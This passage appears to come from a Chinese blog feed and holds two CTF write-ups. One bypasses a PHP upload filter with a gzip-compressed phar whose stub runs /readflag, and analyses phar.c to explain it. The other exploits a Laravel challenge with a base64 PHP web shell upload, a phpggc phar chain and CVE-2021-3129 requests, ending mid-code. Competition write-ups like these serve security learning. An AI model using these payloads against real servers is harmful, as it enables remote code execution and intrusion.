class="string">&quot;submit&quot;</span> value=<span class="string">&quot;upload&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><code>upload.php</code>限制了文件，经过测试发现只要是正常的安全文件都能通过，同时我本地测试将一个条件删除<code>stripos($data, &quot;&lt;?&quot;) !== false</code>，利用短标签成功getshell，此刻我就在想能否绕过这个函数，查看官方文档发现是进行ASCII比较，于是利用编码反复尝试，但是都失败了。</p><p>在文件上传常用姿势里面，Race Condition确实是个很好的选择，但是此题不通，因为在目标移动之前就已经die了，所以得想另外的办法。当我进入本地的docker容器时，我发现个问题，就是里面有zlib和phar拓展，不过代码中对stub头进行了限制，不过，我上传文件的时候发现一个问题，他的检测长度其实并不长。</p><p>知道了这么多信息，但是我还是像个无能的丈夫一样，没能打通，今早上看到WP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    system(&#x27;/readflag&#x27;);</span></span><br><span class="line"><span class="string">    __HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -c exploit.phar &gt; exp.phar.gz</span><br></pre></td></tr></table></figure><p>为什么会藏在stub头里面呢，我们前面知道他检测长度确实不长，但是™的也太离谱了吧。</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-123315.jpg" alt="1"></p><p>使用<code>file_get_contents</code>来打开这个压缩文件之后，全是乱码，自然而然的这里就检测不到了，所以和检测长度其实也没有关系。到这里就成功上传了，没有任何问题。</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-124803.jpg" alt="1"></p><p>但是并不是说这里就是会触发phar反序列化，类都没有哪里来的phar反序列化呢，而是最后的include包含了文件中的恶意内容（本地我改成whoami了）</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-124935.jpg" alt="1"></p><p>但是为什么呢，这就得去看函数源码了(本人太菜了)，但是我师父帮我看了看</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250728160811.png" alt="1"></p><p>他到了这里就要跟进到<code>phar.c</code>了，到了<code>phar_compile_file</code></p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250728160908.png" alt="1"></p><p>然后跟进到了<code>phar_open_from_fp</code>，主要看这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_result <span class="title function_">phar_open_from_fp</span><span class="params">(php_stream* fp, <span class="type">char</span> *fname, <span class="type">size_t</span> fname_len, <span class="type">char</span> *alias, <span class="type">size_t</span> alias_len, <span class="type">uint32_t</span> options, phar_archive_data** pphar, <span class="type">char</span> **error)</span> <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> token[] = <span class="string">&quot;__HALT_COMPILER();&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> zip_magic[] = <span class="string">&quot;PK\x03\x04&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> gz_magic[] = <span class="string">&quot;\x1f\x8b\x08&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> bz_magic[] = <span class="string">&quot;BZh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *pos, test = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="type">int</span> recursion_count = <span class="number">3</span>; <span class="comment">// arbitrary limit to avoid too deep or even infinite recursion</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> window_size = <span class="number">1024</span>;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">1024</span> + <span class="keyword">sizeof</span>(token)]; <span class="comment">/* a 1024 byte window + the size of the halt_compiler token (moving window) */</span></span><br><span class="line"><span class="type">const</span> zend_long readsize = <span class="keyword">sizeof</span>(buffer) - <span class="keyword">sizeof</span>(token);</span><br><span class="line"><span class="type">const</span> zend_long tokenlen = <span class="keyword">sizeof</span>(token) - <span class="number">1</span>;</span><br><span class="line">zend_long halt_offset;</span><br><span class="line"><span class="type">size_t</span> got;</span><br><span class="line"><span class="type">uint32_t</span> compression = PHAR_FILE_COMPRESSED_NONE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">*error = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">-1</span> == php_stream_rewind(fp)) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;cannot rewind phar \&quot;%s\&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buffer[<span class="keyword">sizeof</span>(buffer)<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">32</span>, <span class="keyword">sizeof</span>(token));</span><br><span class="line">halt_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maybe it&#x27;s better to compile the file instead of just searching,  */</span></span><br><span class="line"><span class="comment">/* but we only want the offset. So we want a .re scanner to find it. */</span></span><br><span class="line"><span class="keyword">while</span>(!php_stream_eof(fp)) &#123;</span><br><span class="line"><span class="keyword">if</span> ((got = php_stream_read(fp, buffer+tokenlen, readsize)) &lt; (<span class="type">size_t</span>) tokenlen) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;internal corruption of phar \&quot;%s\&quot; (truncated entry)&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!test &amp;&amp; recursion_count) &#123;</span><br><span class="line">test = <span class="string">&#x27;\1&#x27;</span>;</span><br><span class="line">pos = buffer+tokenlen;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(pos, gz_magic, <span class="number">3</span>)) &#123;</span><br><span class="line"><span class="type">char</span> err = <span class="number">0</span>;</span><br><span class="line">php_stream_filter *filter;</span><br><span class="line">php_stream *temp;</span><br><span class="line"><span class="comment">/* to properly decompress, we have to tell zlib to look for a zlib or gzip header */</span></span><br><span class="line">zval filterparams;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!PHAR_G(has_zlib)) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress gzipped phar archive \&quot;%s\&quot; to temporary file, enable zlib extension in php.ini&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">array_init(&amp;filterparams);</span><br><span class="line"><span class="comment">/* this is defined in zlib&#x27;s zconf.h */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MAX_WBITS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_WBITS 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">add_assoc_long_ex(&amp;filterparams, <span class="string">&quot;window&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;window&quot;</span>) - <span class="number">1</span>, MAX_WBITS + <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* entire file is gzip-compressed, uncompress to temporary file */</span></span><br><span class="line"><span class="keyword">if</span> (!(temp = php_stream_fopen_tmpfile())) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to create temporary file for decompression of gzipped phar archive \&quot;%s\&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_rewind(fp);</span><br><span class="line">filter = php_stream_filter_create(<span class="string">&quot;zlib.inflate&quot;</span>, &amp;filterparams, php_stream_is_persistent(fp));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filter) &#123;</span><br><span class="line">err = <span class="number">1</span>;</span><br><span class="line">add_assoc_long_ex(&amp;filterparams, <span class="string">&quot;window&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;window&quot;</span>) - <span class="number">1</span>, MAX_WBITS);</span><br><span class="line">filter = php_stream_filter_create(<span class="string">&quot;zlib.inflate&quot;</span>, &amp;filterparams, php_stream_is_persistent(fp));</span><br><span class="line">zend_array_destroy(Z_ARR(filterparams));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filter) &#123;</span><br><span class="line">php_stream_close(temp);</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress gzipped phar archive \&quot;%s\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_array_destroy(Z_ARR(filterparams));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_filter_append(&amp;temp-&gt;writefilters, filter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">php_stream_filter_remove(filter, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">php_stream_close(temp);</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress gzipped phar archive \&quot;%s\&quot;, ext/zlib is buggy in PHP versions older than 5.2.6&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">php_stream_close(temp);</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress gzipped phar archive \&quot;%s\&quot; to temporary file&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_filter_flush(filter, <span class="number">1</span>);</span><br><span class="line">php_stream_filter_remove(filter, <span class="number">1</span>);</span><br><span class="line">php_stream_close(fp);</span><br><span class="line">fp = temp;</span><br><span class="line">php_stream_rewind(fp);</span><br><span class="line">compression = PHAR_FILE_COMPRESSED_GZ;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* now, start over */</span></span><br><span class="line">test = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!--recursion_count) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress gzipped phar archive \&quot;%s\&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(pos, bz_magic, <span class="number">3</span>)) &#123;</span><br><span class="line">php_stream_filter *filter;</span><br><span class="line">php_stream *temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!PHAR_G(has_bz2)) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress bzipped phar archive \&quot;%s\&quot; to temporary file, enable bz2 extension in php.ini&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* entire file is bzip-compressed, uncompress to temporary file */</span></span><br><span class="line"><span class="keyword">if</span> (!(temp = php_stream_fopen_tmpfile())) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to create temporary file for decompression of bzipped phar archive \&quot;%s\&quot;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_rewind(fp);</span><br><span class="line">filter = php_stream_filter_create(<span class="string">&quot;bzip2.decompress&quot;</span>, <span class="literal">NULL</span>, php_stream_is_persistent(fp));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filter) &#123;</span><br><span class="line">php_stream_close(temp);</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress bzipped phar archive \&quot;%s\&quot;, filter creation failed&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_filter_append(&amp;temp-&gt;writefilters, filter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SUCCESS != php_stream_copy_to_stream_ex(fp, temp, PHP_STREAM_COPY_ALL, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">php_stream_filter_remove(filter, <span class="number">1</span>);</span><br><span class="line">php_stream_close(temp);</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress bzipped phar archive \&quot;%s\&quot; to temporary file&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php_stream_filter_flush(filter, <span class="number">1</span>);</span><br><span class="line">php_stream_filter_remove(filter, <span class="number">1</span>);</span><br><span class="line">php_stream_close(fp);</span><br><span class="line">fp = temp;</span><br><span class="line">php_stream_rewind(fp);</span><br><span class="line">compression = PHAR_FILE_COMPRESSED_BZ2;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* now, start over */</span></span><br><span class="line">test = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!--recursion_count) &#123;</span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;unable to decompress bzipped phar archive \&quot;%s\&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(pos, zip_magic, <span class="number">4</span>)) &#123;</span><br><span class="line">php_stream_seek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="keyword">return</span> phar_parse_zipfile(fp, fname, fname_len, alias, alias_len, pphar, error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (got &gt;= <span class="number">512</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (phar_is_tar(pos, fname)) &#123;</span><br><span class="line">php_stream_rewind(fp);</span><br><span class="line"><span class="keyword">return</span> phar_parse_tarfile(fp, fname, fname_len, alias, alias_len, pphar, compression, error);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (got &gt; <span class="number">0</span> &amp;&amp; (pos = phar_strnstr(buffer, got + <span class="keyword">sizeof</span>(token), token, <span class="keyword">sizeof</span>(token)<span class="number">-1</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">halt_offset += (pos - buffer); <span class="comment">/* no -tokenlen+tokenlen here */</span></span><br><span class="line"><span class="keyword">return</span> phar_parse_pharfile(fp, fname, fname_len, alias, alias_len, halt_offset, pphar, compression, error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">halt_offset += got;</span><br><span class="line">memmove(buffer, buffer + window_size, tokenlen); <span class="comment">/* move the memory buffer by the size of the window */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAPPHAR_ALLOC_FAIL(<span class="string">&quot;internal corruption of phar \&quot;%s\&quot; (__HALT_COMPILER(); not found)&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他会在这里对zip、bz2、gzip、tar的文件进行自动解压然后解析phar文件。</p><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-164355.jpg" alt="1"></p><p>我们以gz文件为例子谈谈。</p><p>检测到是gz文件，然后解压缩到 &#x2F;tmp&#x2F;下面的一个随机文件，再次包含的时候fp指针指向的是tmp下面的那个解压后的文件。</p><p>随便拿个bz2来进行测试肯定也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bz2</span><br><span class="line">input_file = <span class="string">&#x27;exploit.phar&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;exploit.phar.bz2&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in:</span><br><span class="line">    <span class="keyword">with</span> bz2.<span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        f_out.write(f_in.read())</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/7/deadsecCTF2025/QQ20250728-170127.jpg" alt="1"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>比赛过程很坐牢，复现很舒服</p>]]></content>
    
    
    <summary type="html">来看看C语言代码吗</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="mysql" scheme="https://baozongwi.xyz/tags/mysql/"/>
    
    <category term="phar" scheme="https://baozongwi.xyz/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>L3HCTF2025_gogogo出发喽</title>
    <link href="https://baozongwi.xyz/posts/7a0d6713.html"/>
    <id>https://baozongwi.xyz/posts/7a0d6713.html</id>
    <published>2025-07-15T12:57:24.000Z</published>
    <updated>2025-08-08T04:03:06.162Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>我们这次战斗力十分凶猛，很快就把前三个web做了，这个Laravel我也早就看到了，但是40M的压缩包，太大了，不想审代码，不过到了后面我们是第一名的时候，也是箭在弦上不得不发了。只能强迫自己去看这套有点shi的代码，但是其实和作者自己写的一部分没什么关系，就是一个原生Laravel的漏洞</p><h2 id="好戏开锣"><a href="#好戏开锣" class="headerlink" title="好戏开锣"></a>好戏开锣</h2><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-202534.jpg" alt="1"></p><p>我们进入靶机地址可以看到是Laravel框架，我暂且不谈那个一大坨的代码去审个0day，因为他如果真是0day，对我其实还有好处，我们先进行目录扫描。</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-210934.jpg" alt="1"></p><p>看到了一个上传文件的路由，我们先用工具进行自动化审计，找找文件上传的洞，没看到什么特别明显的，看看路由</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-215631.jpg" alt="1"></p><p>直接写出来了，测试也发现能够成功</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/image/base64</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.95.8.146:41164</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1.95.8.146:41164</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1.95.8.146:41164/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;data&quot;: &quot;data:image/jpeg;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-215718.jpg" alt="1"></p><p>很明显他是不解析的图片，那我们要能够后缀可控的话，是能直接文件上传getshell，但是并不可以。思考了一会，我们有两种选择，第一，phar反序列化，第二，进后台。</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/1.png" alt="1"></p><p>虽然是Bcrypto但是依旧是弱密码一个，爆破出来为<code>admin888</code>，本地进入后台成功getshell！不过回到比赛平台复现，失败了，显示419错误</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-220344.jpg" alt="1"></p><h2 id="再回首"><a href="#再回首" class="headerlink" title="再回首"></a>再回首</h2><p>在这之后，我就卡了很久很久，我们刚才说过，还有一条路，进行phar反序列化，我们找到Laravel版本为</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-220657.jpg" alt="1"></p><p>这个版本已经不维护了，所以肯定是老洞，找到本题开启了debug模式。访问<code>/_ignition/health-check</code>得到了<code>&#123;“can_execute_commands”:true&#125;</code>，很容易搜到<strong>CVE-2021-3129</strong>漏洞，查看逻辑，这里不同的是，他可以清空log来存储phar文件，这里我测试了，发现不能写入phar文件，但是，刚好我有一个上传文件的接口。</p><p>简单的进行测试，生成phar文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;phpinfo();&quot;</span> --phar phar -o /tmp/phar.gif</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/phar.gif | <span class="built_in">base64</span> -w 0</span><br></pre></td></tr></table></figure><p>我发现了一个重要的问题，非常重要的问题！也是这题如此艰难的问题~</p><p><img src="/../images/achieve/2025/7/L3HCTF2025/6CCF5ADE178990A3CE89A3AD129F3573.png" alt="1"></p><p>总是会触发file_put_contents，这并不是sink点，而且我们知道phar文件一旦被污染，则不能正常反序列化。经过几个小时的测试，以及花哥的点播，我发现可以利用fast_destruct来绕过，但是为什么呢，为什么，为什么，为什么</p><p>这里暂时不谈，先说做的过程。<a href="https://baozongwi.xyz/2024/10/12/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bypass/">https://baozongwi.xyz/2024/10/12/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bypass/</a> ，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.95.8.146:41164</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;solution&quot;</span>:<span class="string">&quot;Facade<span class="subst">\\</span>Ignition<span class="subst">\\</span>Solutions<span class="subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,<span class="string">&quot;parameters&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;viewFile&quot;</span>:<span class="string">&quot;phar:///var/www/html/public/uploads/images/_uc40mzhOJ6cNEKoF.jpeg/test.txt&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;variableName&quot;</span>:<span class="string">&quot;test&quot;</span></span></span><br><span class="line"><span class="language-swift">&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/7/L3HCTF2025/QQ20250716-222026.jpg" alt="1"></p><p>权限足够，直接在<code>/var/www/html</code>写个木马，链接之后suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 